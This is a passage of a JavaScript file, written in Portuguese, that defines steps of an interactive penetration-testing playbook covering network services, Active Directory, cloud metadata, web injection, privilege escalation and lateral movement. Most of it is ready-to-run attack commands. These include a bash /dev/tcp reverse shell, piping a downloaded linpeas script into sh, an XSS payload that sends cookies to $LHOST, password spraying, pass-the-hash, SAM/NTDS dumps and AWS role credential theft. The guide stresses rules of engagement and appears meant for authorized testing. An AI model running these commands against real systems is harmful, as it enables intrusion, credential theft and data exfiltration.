        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    nfs: {
      phase: "Rede",
      title: "NFS",
      say: "Share NFS sem root_squash (ou com) = ler/escrever arquivos que não deveriam estar na rede.",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sV -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs "$IP"
showmount -e "$IP"`,
          label: "bash",
        },
        {
          title: "Mount",
          cmd: `mkdir -p /tmp/nfs
mount -t nfs "$IP:/export" /tmp/nfs -o nolock
ls -la /tmp/nfs
# procura id_rsa, web roots, backups`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Chave SSH achada", to: "ssh" },
        { label: "Webroot gravável — shell", to: "shell" },
        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    snmp: {
      phase: "Rede",
      title: "SNMP",
      say: "Community public/private ainda existe em 202X. Walk entrega users, rotas e às vezes creds em clear.",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sU -p 161 --script snmp-info,snmp-processes,snmp-win32-users "$IP"
snmpwalk -v2c -c public "$IP"
# communities comuns:
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "$IP"`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Users → SSH", to: "ssh" },
        { label: "Users → WinRM", to: "winrm" },
        { label: "Reportar community/info", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    "dns-axfr": {
      phase: "Rede",
      title: "DNS zone transfer",
      say: "AXFR aberto = mapa interno de graça. Teste clássico, finding fácil, impacto alto em recon.",
      blocks: [
        {
          title: "Transfer",
          cmd: `dig ns "$DOMAIN" +short
# pra cada NS:
dig axfr "$DOMAIN" @"$IP"
# se DOMAIN ≠ IP do NS, usa o NS real:
# dig axfr "$DOMAIN" @ns1.alvo.tld`,
          label: "bash",
        },
        {
          title: "Sem AXFR",
          html: `<p>Segue com enum passiva + brute DNS (<code>dnsx</code>/<code>ffuf</code> em nomes). AXFR negado ≠ domínio seguro — só fechou a porta da frente.</p>`,
        },
      ],
      choices: [
        { label: "Hosts novos → trio/ports", to: "ports" },
        { label: "Passivo / subfinder", to: "passive" },
        { label: "AXFR = reportar", to: "report" },
      ],
    },

    postgres: {
      phase: "Rede",
      title: "PostgreSQL (5432)",
      say: "Postgres na borda com cred fraca = dump + possível RCE via COPY/program (versão/config dependente).",
      blocks: [
        {
          title: "Enum + login",
          cmd: `nmap -sV -p 5432 --script pgsql-brute "$IP"
psql -h "$IP" -U postgres -d postgres
# \\l  \\du  \\dt`,
          label: "bash",
        },
        {
          title: "Prova",
          cmd: `SELECT version();
SELECT current_user;`,
          label: "psql",
          why: "Não dumpa tudo sem necessidade. Schema + amostra = evidência.",
        },
      ],
      choices: [
        { label: "RCE/extensão — shell", to: "shell" },
        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    redis: {
      phase: "Rede",
      title: "Redis (6379)",
      say: "Redis sem auth na rede = write de chave, às vezes SSH key ou cron. Clássico e ainda funciona.",
      tone: "warn",
      blocks: [
        {
          title: "Auth check",
          cmd: `nmap -sV -p 6379 --script redis-info "$IP"
redis-cli -h "$IP" INFO
redis-cli -h "$IP" CONFIG GET dir`,
          label: "bash",
        },
        {
          title: "Abuso high-level",
          html: `<ul>
            <li><code>CONFIG SET dir /var/www/html</code> + webshell (se path web)</li>
            <li>Escrever <code>authorized_keys</code> (se user redis = writable home)</li>
            <li>Module load / master-slave (avançado, RoE!)</li>
          </ul>`,
          cmd: `redis-cli -h "$IP" <<'EOF'
CONFIG GET *
SAVE
EOF`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Consegui exec — shell", to: "shell" },
        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    mongodb: {
      phase: "Rede",
      title: "MongoDB (27017)",
      say: "Mongo sem auth ainda aparece. Lista DBs, prova leitura, não exfiltra o data lake inteiro.",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sV -p 27017 --script mongodb-info,mongodb-databases "$IP"
mongosh --host "$IP" --eval 'db.adminCommand({ listDatabases: 1 })'`,
          label: "bash",
        },
        {
          title: "Prova",
          cmd: `mongosh --host "$IP"
# show dbs
# use app; db.users.find().limit(3)`,
          label: "mongosh",
        },
      ],
      choices: [
        { label: "Dados sensíveis — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    elasticsearch: {
      phase: "Rede",
      title: "Elasticsearch (9200)",
      say: "ES aberto = busca em tudo que indexaram. Inclui PII, logs, às vezes creds.",
      blocks: [
        {
          title: "Enum",
          cmd: `curl -s "http://$IP:9200/"
curl -s "http://$IP:9200/_cat/indices?v"
curl -s "http://$IP:9200/_search?pretty&size=5"`,
          label: "bash",
        },
        {
          title: "Atenção",
          html: `<p>Não baixa índice inteiro. Amostra + campos sensíveis = finding. Write/_delete só com RoE explícito.</p>`,
        },
      ],
      choices: [
        { label: "Reportar exposição", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    /* ——— AD / CLOUD / MOBILE ——— */
    "ad-attack": {
      phase: "AD",
      title: "AD hub — mindset",
      say: "AD = grafo. Enum → cred → BloodHound → caminho curto → lateral. Spray depois, não no minuto 1.",
      blocks: [
        {
          title: "1. Enum",
          html: `<ul>
            <li>SMB null / LDAP anonymous / zone DNS</li>
            <li>Users: <code>nxc smb $IP --users</code>, RID cycle</li>
            <li>Password policy antes de spray</li>
          </ul>`,
          cmd: `nxc smb "$IP"
nxc smb "$IP" --users
nxc ldap "$IP" -u '' -p '' --password-not-required`,
          label: "bash",
        },
        {
          title: "2. Spray consciente",
          cmd: `nxc smb "$IP" -u $USERS -p 'Winter2024!' --continue-on-success
# uma senha por vez, respeita lockout do policy`,
          label: "bash",
          why: "RoE + lockout. Spray burro derruba conta e o engajamento.",
        },
        {
          title: "3. BloodHound mindset",
          html: `<ul>
            <li>Coleta: SharpHound / bloodhound-python / nxc ldap --bloodhound</li>
            <li>Perguntas: path to DA? session em quem? ACL absurda? unconstrained?</li>
            <li>Não é dashboard bonito — é GPS do ataque</li>
          </ul>`,
          cmd: `bloodhound-python -d "$DOMAIN" -u user -p 'pass' -ns "$IP" -c All
# ou: nxc ldap "$IP" -u user -p 'pass' --bloodhound -c All --dns-server "$IP"`,
          label: "bash",
        },
        {
          title: "4. Lateral",
          html: `<p>Cred/hash na mão → <strong>lateral</strong> (PTH, evil-winrm, PsExec nxc). Kerberos/AS-REP/ADCS → ramos específicos.</p>`,
        },
      ],
      choices: [
        { label: "nxc SMB fundo", to: "nxc-smb" },
        { label: "Kerberos / roast", to: "kerberos" },
        { label: "LDAP enum", to: "ldap" },
        { label: "WinRM", to: "winrm" },
        { label: "Responder (só LAN/RoE)", to: "responder" },
        { label: "Lateral movement", to: "lateral" },
        { label: "Reportar path/cred", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    "nxc-smb": {
      phase: "AD",
      title: "NetExec / nxc — SMB",
      say: "nxc (ex-crackmapexec) é o canivete. Auth check, shares, sam, spider — tudo com a mesma UX.",
      blocks: [
        {
          title: "Auth / genérico",
          cmd: `nxc smb "$IP" -u user -p 'pass'
nxc smb "$IP" -u user -H 'NTHASH'
nxc smb "$IP" -u $USERS -p $WORDLIST_PASS --continue-on-success`,
          label: "bash",
        },
        {
          title: "Shares / spider",
          cmd: `nxc smb "$IP" -u user -p 'pass' --shares
nxc smb "$IP" -u user -p 'pass' -M spider_plus`,
          label: "bash",
        },
        {
          title: "SAM / LSA (se priv permitir)",
          cmd: `nxc smb "$IP" -u user -p 'pass' --sam
nxc smb "$IP" -u user -p 'pass' --lsa
nxc smb "$IP" -u user -p 'pass' --ntds`,
          label: "bash",
          why: "Dump NTDS = Critical. Só com RoE e necessidade de impacto.",
        },
        {
          title: "Exec",
          cmd: `nxc smb "$IP" -u user -p 'pass' -x 'whoami'
nxc smb "$IP" -u user -H 'NTHASH' -x 'hostname'`,
          label: "bash",
        },
      ],
      choices: [
        { label: "AD hub", to: "ad-attack" },
        { label: "WinRM com a mesma cred", to: "winrm" },
        { label: "Hash → crack", to: "crack-hash" },
        { label: "Lateral", to: "lateral" },
        { label: "Privesc Windows", to: "privesc-windows" },
        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    responder: {
      phase: "AD",
      title: "Responder (LLMNR / NBT-NS)",
      say: "Só em LAN e com escopo pra poisoning. Fora disso = barulho e fora do alvo.",
      tone: "warn",
      blocks: [
        {
          title: "Antes",
          html: `<ul>
            <li>Segmento local / lab / broadcast no escopo?</li>
            <li>Não é ferramenta de internet-facing</li>
            <li>Box HTB isolada → geralmente pula</li>
          </ul>`,
        },
        {
          title: "Uso",
          cmd: `sudo responder -I tun0 -wd
# captura NTLMv2 → hashcat -m 5600
# WPAD/HTTP basic também podem cair`,
          label: "bash",
        },
        {
          title: "Depois do hash",
          html: `<p>Crack → spray/nxc. Ou relay com ntlmrelayx se o RoE e o cenário SMB signing off permitirem (outro nível de agressão).</p>`,
        },
      ],
      choices: [
        { label: "Hash → crack hub", to: "crack-hash" },
        { label: "Hash crackado → nxc", to: "nxc-smb" },
        { label: "NTLM relay (RoE)", to: "ntlm-relay" },
        { label: "AD hub", to: "ad-attack" },
        { label: "Reportar capture/relay path", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    "aws-metadata": {
      phase: "Cloud",
      title: "AWS metadata / IAM",
      say: "169.254.169.254 (SSRF ou shell) = credenciais da role. aws cli a partir daí.",
      tone: "warn",
      blocks: [
        {
          title: "IMDSv1",
          cmd: `curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME`,
          label: "bash",
        },
        {
          title: "IMDSv2",
          cmd: `TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
          label: "bash",
        },
        {
          title: "aws cli concepts",
          cmd: `export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
aws iam list-attached-role-policies --role-name ROLE`,
          label: "bash",
          why: "Enum permissões. Não cria recurso destrutivo. Exfil S3 só com RoE e amostragem.",
        },
      ],
      choices: [
        { label: "Veio de SSRF", to: "web-ssrf" },
        { label: "Shell na instância — privesc", to: "privesc-linux" },
        { label: "Cred/role — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    "k8s-exposed": {
      phase: "Cloud",
      title: "Kubernetes exposto",
      say: "API server / kubelet / dashboard sem auth = cluster em risco. kubectl lista o que o escopo permitir.",
      tone: "warn",
      blocks: [
        {
          title: "Sinais de porta",
          cmd: `nmap -sV -p 6443,8443,10250,10255,2379,4194 "$IP"
curl -sk https://"$IP":6443/version
curl -sk https://"$IP":10250/pods`,
          label: "bash",
        },
        {
          title: "kubectl mindset",
          cmd: `kubectl --server=https://"$IP":6443 --insecure-skip-tls-verify get pods -A
# se tiver ServiceAccount token no pod:
# cat /var/run/secrets/kubernetes.io/serviceaccount/token`,
          label: "bash",
        },
        {
          title: "Achados típicos",
          html: `<ul>
            <li>Anonymous get pods/secrets</li>
            <li>Kubelet 10250 exec sem auth</li>
            <li>etcd 2379 aberto</li>
            <li>Dashboard sem login</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "SSRF → metadata/k8s", to: "web-ssrf" },
        { label: "Shell no node/pod", to: "shell" },
        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    "android-apk": {
      phase: "Mobile",
      title: "Android APK — static",
      say: "APK no escopo: descompila, lê, não inventa runtime ainda. apktool + jadx cobrem 80% do static.",
      blocks: [
        {
          title: "Unpack / smali",
          cmd: `apktool d app.apk
# AndroidManifest, resources, smali`,
          label: "bash",
        },
        {
          title: "Java almost-source (jadx)",
          cmd: `jadx -d ./apk_jadx app.apk
# procura: API keys, URLs, WebView JS bridges, certificate pinning flags`,
          label: "bash",
        },
        {
          title: "Checklist static",
          html: `<ul>
            <li><code>AndroidManifest.xml</code>: exported activities/services/receivers</li>
            <li>Backup allowed? debuggable?</li>
            <li>Secrets em <code>strings.xml</code> / BuildConfig</li>
            <li>Deep links / intent extras sem validação</li>
          </ul>
          <p>Runtime (Frida/emulator) só se o engajamento pedir e o lab estiver armado.</p>`,
        },
      ],
      choices: [
        { label: "API backend → web-api", to: "web-api" },
        { label: "Secret/hardcode — reportar", to: "report" },
        { label: "Mapa de portas / web", to: "ports" },
      ],
    },

    /* ——— PRIVESC / LATERAL / RETEST ——— */
    "privesc-linux": {
      phase: "Privesc",
      title: "Privesc Linux",
      say: "Shell user ≠ fim. linpeas primeiro pra mapa; sudo -l / SUID / cron pra achados acionáveis.",
      blocks: [
        {
          title: "linpeas",
          cmd: `# no atacante:
python3 -m http.server 80
# no alvo:
curl -L http://"$LHOST"/linpeas.sh | sh`,
          label: "alvo",
        },
        {
          title: "sudo -l",
          cmd: `sudo -l
# GTFOBins pro binário permitido`,
          label: "shell",
        },
        {
          title: "SUID / capabilities",
          cmd: `find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null`,
          label: "shell",
        },
        {
          title: "Cron / timers",
          cmd: `ls -la /etc/cron* /var/spool/cron 2>/dev/null
systemctl list-timers --all 2>/dev/null
# writable script rodando como root = win`,
          label: "shell",
        },
      ],
      choices: [
        { label: "Root — evidência + report", to: "report" },
        { label: "Creds → lateral", to: "lateral" },
        { label: "Voltar ao shell", to: "shell" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    "privesc-windows": {
      phase: "Privesc",
      title: "Privesc Windows",
      say: "winpeas + checks manuais: AlwaysInstallElevated, token privileges, unquoted service path.",
      blocks: [
        {
          title: "winpeas",
          cmd: `# transfer via smb/http/evil-winrm upload
.\\winPEASx64.exe`,
          label: "cmd/ps",
        },
        {
          title: "AlwaysInstallElevated",
          cmd: `reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# ambos 1 = MSI como SYSTEM`,
          label: "cmd",
        },
        {
          title: "Token / privileges",
          cmd: `whoami /priv
# SeImpersonatePrivilege → potato family (com RoE)`,
          label: "cmd",
        },
        {
          title: "Unquoted service path",
          cmd: `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\"
# path com espaço sem aspas + dir gravável = hijack`,
          label: "cmd",
        },
      ],
      choices: [
        { label: "SYSTEM/Admin — reportar", to: "report" },
        { label: "Hash/cred → lateral", to: "lateral" },
        { label: "Voltar ao shell", to: "shell" },
        { label: "AD hub", to: "ad-attack" },
      ],
    },

    lateral: {
      phase: "Lateral",
      title: "Movimentação lateral",
      say: "Cred ou hash em mãos. Agora é reusar com o mínimo de barulho: PTH, WinRM, PsExec via nxc.",
      blocks: [
        {
          title: "Pass-the-hash",
          cmd: `impacket-psexec -hashes :NTHASH domain/user@"$IP"
impacket-wmiexec -hashes :NTHASH domain/user@"$IP"
nxc smb "$IP" -u user -H 'NTHASH' -x 'whoami'`,
          label: "bash",
        },
        {
          title: "evil-winrm",
          cmd: `evil-winrm -i "$IP" -u user -H 'NTHASH'`,
          label: "bash",
        },
        {
          title: "PsExec via nxc",
          cmd: `nxc smb "$IP" -u user -p 'pass' -x 'hostname'
nxc smb targets.txt -u user -H 'NTHASH' --continue-on-success`,
          label: "bash",
          why: "targets.txt = hosts do BloodHound/nmap in-scope. Não varre a empresa inteira no escuro.",
        },
      ],
      choices: [
        { label: "Nova shell — privesc Win", to: "privesc-windows" },
        { label: "Nova shell — privesc Linux", to: "privesc-linux" },
        { label: "AD hub / próximo path", to: "ad-attack" },
        { label: "Documentar lateral", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    /* ——— WEB FIELD GUIDE (v2.1) ——— */
    "web-lfi": {
      phase: "Web",
      title: "LFI / path traversal",
      say: "Param de arquivo (`page=`, `file=`, `template=`) sem path hardcode = leitura arbitrária. Wrapper PHP e log poison viram RCE.",
      blocks: [
        {
          title: "Probes clássicos",
          cmd: `curl -s "$TARGET/page?file=../../../../etc/passwd"
curl -s "$TARGET/page?file=....//....//....//etc/passwd"
# ffuf traversal
ffuf -u "$TARGET/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0`,
          label: "bash",
        },
        {
          title: "PHP wrappers",
          cmd: `# source disclosure
curl -s "$TARGET/page?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d
# expect / input (se allow_url_include / expect)
# php://input + POST body com <?php system($_GET['c']); ?>`,
          label: "bash",
          why: "Base64 filter prova LFI mesmo com include que não 'printa' texto claro.",
        },
        {
          title: "Log poison (quando dá)",
          html: `<ul>
            <li>Injeta PHP no User-Agent → inclui <code>/var/log/apache2/access.log</code></li>
            <li>Ou session file + LFI no path de sessões</li>
            <li>Sem RCE estável: finding de arbitrary file read já é High</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "RCE via poison/wrapper — shell", to: "shell" },
        { label: "SSRF cheiro (URL remota)", to: "web-ssrf" },
        { label: "Leitura sensível — reportar", to: "report" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    "web-sqli": {
      phase: "Web",
      title: "SQL injection",
      say: "Confirma manual no Repeater. sqlmap entra depois do ponto existir — não no escuro.",
      blocks: [
        {
          title: "Probes manuais",
          cmd: `# error / syntax
curl -s "$TARGET/item?id=1'"
curl -s "$TARGET/item?id=1 AND 1=1"
curl -s "$TARGET/item?id=1 AND 1=2"
# boolean / time (MySQL)
curl -s "$TARGET/item?id=1' AND SLEEP(3)-- -"`,
          label: "bash",
          why: "Diferença de body/tempo/erro = ponto. Se quiser sqlmap -r, salva o request do Burp à mão.",
        },
        {
          title: "sqlmap no request",
          cmd: `sqlmap -u "$TARGET" $SQLMAP_OPTS -p $SQLMAP_PARAM --batch --dbs
# dump pontual (não o planeta):
sqlmap -u "$TARGET" $SQLMAP_OPTS -p $SQLMAP_PARAM -D DB -T users --dump --threads 4
# shell OS se DBA + file/exec:
sqlmap -u "$TARGET" $SQLMAP_OPTS -p $SQLMAP_PARAM --os-shell`,
          label: "bash",
        },
        {
          title: "Union / WAF",
          html: `<ul>
            <li>Descobre colunas com <code>ORDER BY n</code> / <code>UNION SELECT NULL…</code></li>
            <li>WAF: encoding, comentários inline, second-order — documenta bypass se achares</li>
            <li>NoSQL? → ramo Mongo / parâmetro JSON, não este nó</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "os-shell / file write — shell", to: "shell" },
        { label: "Creds no dump → crack", to: "crack-hash" },
        { label: "Dados sensíveis — reportar", to: "report" },
        { label: "Auth / login SQLi", to: "web-auth" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    "web-xss": {
      phase: "Web",
      title: "XSS",
      say: "XSS: reflected / stored / DOM. Impacto = sessão ou ação no browser da vítima.",
      blocks: [
        {
          title: "Checklist rápido",
          html: `<ul>
            <li><strong>Reflected:</strong> param ecoa no HTML? Context (HTML/attr/JS/URL)?</li>
            <li><strong>Stored:</strong> comentário, perfil, ticket — quem vê?</li>
            <li><strong>DOM:</strong> sink em <code>innerHTML</code>/<code>eval</code>/<code>location</code> (DevTools)</li>
            <li>CSP presente? Reporta bypass ou impacto residual</li>
          </ul>`,
        },
        {
          title: "Probes",
          cmd: `curl -s "$TARGET/search?q=<script>alert(1)</script>"
# polyglot / context break
curl -s "$TARGET/search?q=\"><img src=x onerror=alert(1)>"
# cookie steal PoC (só lab / RoE):
# <script>fetch('http://$LHOST/?c='+document.cookie)</script>`,
          label: "bash",
        },
        {
          title: "Impacto pra report",
          html: `<p>Session hijack, CSRF + XSS, account takeover, phishing in-app. Sem cookie HttpOnly/Secure = sobe severidade. Com CSP estrito sem bypass = Low/Info + nota.</p>`,
        },
      ],
      choices: [
        { label: "Achado — reportar", to: "report" },
        { label: "Burp Suite", to: "burp-method" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    "web-cmdi": {
      phase: "Web",
      title: "Command injection",
      say: "Input que vira shell no server. Blind? Time-based. Com output? Cat do passwd e cai fora pro listener.",
      tone: "warn",
      blocks: [
        {
          title: "Detecção",
          cmd: `# separadores comuns
curl -s "$TARGET/ping?host=127.0.0.1;id"
curl -s "$TARGET/ping?host=127.0.0.1|id"
curl -s "$TARGET/ping?host=\`id\`"
# blind time
curl -s "$TARGET/ping?host=127.0.0.1;sleep%203"`,
          label: "bash",
        },
        {
          title: "Confirma + callback",
          cmd: `# out-of-band
curl -s "$TARGET/ping?host=127.0.0.1;curl%20http://$LHOST/cmdi"
# reverse (listener já no ar — ramo Shell)
# ;bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'`,
          label: "bash",
          why: "Listener ANTES do payload. Sempre.",
        },
      ],
      choices: [
        { label: "RCE — abrir listener", to: "shell" },
        { label: "Reportar (mesmo blind)", to: "report" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    "web-graphql": {
      phase: "Web",
      title: "GraphQL",
      say: "Introspection + IDOR em argumento = BOLA em GraphQL.",
      blocks: [
        {
          title: "Achar + introspect",
          cmd: `curl -s "$TARGET/graphql" -H 'Content-Type: application/json' \\
  -d '{"query":"{ __schema { types { name } } }"}'
# aliases comuns: /api/graphql /graphiql /v1/graphql`,
          label: "bash",
        },
        {
          title: "Ataques típicos",
          html: `<ul>
            <li>Introspection aberta em prod = Info/Low + mapa de ataque</li>
            <li>Troca <code>id</code> / cursor = BOLA (mesmo ritual do web-api)</li>
            <li>Batching / alias abuse pra rate-limit bypass</li>
            <li>Nested query → DoS (só se RoE permitir)</li>
          </ul>`,
          cmd: `# exemplo BOLA
curl -s "$TARGET/graphql" -H 'Content-Type: application/json' \\
  -H "Authorization: Bearer $TOKEN" \\
  -d '{"query":"query { user(id:\\"2\\") { email role } }"}'`,
          label: "bash",
        },
      ],
      choices: [
        { label: "API / BOLA geral", to: "web-api" },
        { label: "JWT no Authorization", to: "web-jwt" },
        { label: "Achado — reportar", to: "report" },
        { label: "Voltar ao Web", to: "web" },
      ],
    },

    "crack-hash": {
      phase: "Creds",
      title: "Crack de hash",
      say: "Hash sem crack não serve. Modo + wordlist + regras; depois spray/lateral.",
      blocks: [
        {
          title: "Tabela de modos (hashcat)",
          html: `<div class="table-wrap"><table>
            <tr><th>Tipo</th><th>-m</th><th>Onde nasce</th></tr>
            <tr><td>NTLM</td><td>1000</td><td>SAM / nxc --sam / secretsdump</td></tr>
            <tr><td>NetNTLMv2</td><td>5600</td><td>Responder / coerce</td></tr>
            <tr><td>AS-REP ($23$)</td><td>18200</td><td>GetNPUsers</td></tr>
            <tr><td>TGS Kerberoast</td><td>13100</td><td>GetUserSPNs</td></tr>
            <tr><td>JWT HS256</td><td>16500</td><td>web-jwt</td></tr>
            <tr><td>md5crypt / sha512crypt</td><td>500 / 1800</td><td>/etc/shadow</td></tr>
          </table></div>`,
        },
        {
          title: "hashcat",
          cmd: `hashcat -m 5600 HASHFILE $WORDLIST_PASS -r /usr/share/hashcat/rules/best64.rule --force
hashcat -m 18200 HASHFILE $WORDLIST_PASS --force
hashcat -m 13100 HASHFILE $WORDLIST_PASS --force
hashcat -m 1000 HASHFILE $WORDLIST_PASS -O --force
# mostra cracked:
hashcat -m 5600 HASHFILE --show`,
          label: "bash",
        },
        {
          title: "john (fallback)",
          cmd: `john --wordlist=$WORDLIST_PASS HASHFILE
john --show HASHFILE`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Cred → nxc / spray", to: "nxc-smb" },
        { label: "Cred → SSH", to: "ssh" },
        { label: "Cred → WinRM", to: "winrm" },
        { label: "Cred → lateral", to: "lateral" },
        { label: "JWT cracked → web-jwt", to: "web-jwt" },
        { label: "AD hub", to: "ad-attack" },
        { label: "Reportar cred", to: "report" },
      ],
    },

    "ntlm-relay": {
      phase: "AD",
      title: "NTLM relay",
      say: "Capturou auth e o alvo não exige signing? Relay > crack. Confere LAN/escopo antes.",
      tone: "warn",
      blocks: [
        {
          title: "Pré-flight",
          html: `<ul>
            <li>SMB signing OFF no alvo (nxc mostra)</li>
            <li>Escopo LAN / coerce autorizado</li>
            <li>Preferir relay pra LDAP/LDAPS com channel binding consciente</li>
          </ul>`,
          cmd: `nxc smb "$IP" --gen-relay-list TARGETS.txt
# targets sem signing`,
          label: "bash",
        },
        {
          title: "ntlmrelayx (conceito)",
          cmd: `impacket-ntlmrelayx -tf TARGETS.txt -smb2support
# com coerce (PrinterBug/PetitPotam) no segundo terminal — só se RoE ok
# socks / -i / dump secrets conforme objetivo`,
          label: "bash",
          why: "Responder -dw + relay é combo clássico. Sem signing off, relay SMB morre — aí é crack-hash.",
        },
      ],
      choices: [
        { label: "Shell/cred → lateral", to: "lateral" },
        { label: "Sem relay — crack hash", to: "crack-hash" },
        { label: "AD hub", to: "ad-attack" },
        { label: "Reportar path", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    "file-xfer": {
      phase: "Foothold",
      title: "Transferência de arquivo",
      say: "Sem exfil/tools no alvo, privesc trava. Escolhe o canal que o egress deixa passar.",
      blocks: [
        {
          title: "Linux → puxar ferramenta",
          cmd: `# no Kali
python3 -m http.server 80 --directory "$NOTES/tools"
# no alvo
wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
curl -s http://$LHOST/linpeas.sh -o /tmp/linpeas.sh
# sem wget/curl:
# cat > /tmp/x.sh <<'EOF'
# … paste …
# EOF`,
          label: "bash",
        },
        {
          title: "Windows",
          cmd: `# Kali: python3 -m http.server 80
# alvo:
certutil -urlcache -f http://$LHOST/winpeas.exe C:\\Windows\\Temp\\wp.exe
iwr http://$LHOST/wp.exe -OutFile C:\\Windows\\Temp\\wp.exe
# SMB se porta 445 no teu lado:
# impacket-smbserver share . -smb2support`,
          label: "bash / powershell",
        },
        {
          title: "Exfil mínima",
          html: `<p>Só o necessário pro report. <code>scp</code>, <code>nc &lt; file</code>, ou base64 em pedaços se o canal for cego. Não zipa o HD do cliente.</p>`,
        },
      ],
      choices: [
        { label: "Privesc Linux", to: "privesc-linux" },
        { label: "Privesc Windows", to: "privesc-windows" },
        { label: "Voltar ao shell", to: "shell" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    retest: {
      phase: "Entrega",
      title: "Reteste",
      say: "Reteste: reproduz o finding. Patchou de verdade ou só no e-mail?",
      blocks: [
        {
          title: "Checklist de reteste",
          html: `<ol>
            <li>Abre o finding original (repro + evidência)</li>
            <li>Mesmo asset, mesma conta///pré-condição</li>
            <li>Tenta o exploit/request exato</li>
            <li>Se falhar: 1 bypass óbvio (encoding, path alt) — não redesenha o pentest</li>
            <li>Atualiza status: Fixed / Partially Fixed / Not Fixed</li>
          </ol>`,
        },
        {
          title: "Nota de reteste",
          cmd: `# [Retest] Título do finding

**Data:**
**Resultado:** Fixed | Partial | Open
**O que mudou:**
**Evidência nova:** print / nota

## Diff
Antes: …
Depois: …`,
          label: "findings/*.md",
        },
      ],
      choices: [
        { label: "Ainda aberto — voltar ao finding", to: "report" },
        { label: "Outro serviço", to: "ports" },
        { label: "Engajamento novo", to: "roe" },
      ],
    },
  });

  /* ——— PATCHES EM NÓS EXISTENTES ——— */

  if (pb.nodes.alive) {
    pb.nodes.alive.choices = [
      { label: "Alvo alcançável — recon passivo primeiro", hint: "OSINT / subdomains", to: "passive" },
      { label: "Alvo alcançável — rodar o trio", hint: "dig + nmap + gobuster", to: "trio" },
      { label: "Não alcanço o alvo", hint: "Diagnóstico de rota", to: "dead-target" },
    ];
  }

  if (pb.nodes.trio) {
    pb.nodes.trio.choices = [
      { label: "Li o nmap — escolher ramo por porta", hint: "Árvore de serviços", to: "ports" },
      { label: "Passivo ainda não rodei", hint: "OSINT antes/depois", to: "passive" },
    ];
  }

  if (pb.nodes.ports) {
    pb.nodes.ports.choices = [
      /* web */
      { label: "80 / 443 / 8080 · HTTP", hint: "Aplicação web", to: "web" },
      { label: "API / swagger / XHR", hint: "OpenAPI · BOLA", to: "web-api" },
      { label: "GraphQL", hint: "introspection · BOLA", to: "web-graphql" },
      { label: "Login / Basic Auth", hint: "Ramo auth", to: "web-auth" },
      { label: "JWT no fluxo", hint: "none/kid/claims", to: "web-jwt" },
      { label: "SQLi confirmado", hint: "sqlmap / manual", to: "web-sqli" },
      { label: "Nuclei na superfície", hint: "templates CVE · misconfig", to: "nuclei" },
      { label: "WordPress", hint: "wpscan", to: "wordpress" },
      { label: "Jenkins", hint: "script console", to: "jenkins" },
      { label: "Tomcat /manager", hint: "Deploy / MSF", to: "tomcat" },
      { label: "Burp Suite", hint: "Proxy · Repeater", to: "burp-method" },
      { label: "Metasploit", hint: "msfconsole · handler", to: "msf" },
      /* windows / ad */
      { label: "445 / 139 · SMB", hint: "Shares · EternalBlue", to: "smb" },
      { label: "nxc / NetExec SMB", hint: "spray · sam · exec", to: "nxc-smb" },
      { label: "389 / 636 · LDAP", hint: "enum AD", to: "ldap" },
      { label: "88 · Kerberos", hint: "AS-REP · roast", to: "kerberos" },
      { label: "5985 / 5986 · WinRM", hint: "evil-winrm", to: "winrm" },
      { label: "AD hub (grafo)", hint: "enum → BH → lateral", to: "ad-attack" },
      { label: "Hash pra crackar", hint: "hashcat / john", to: "crack-hash" },
      /* classic */
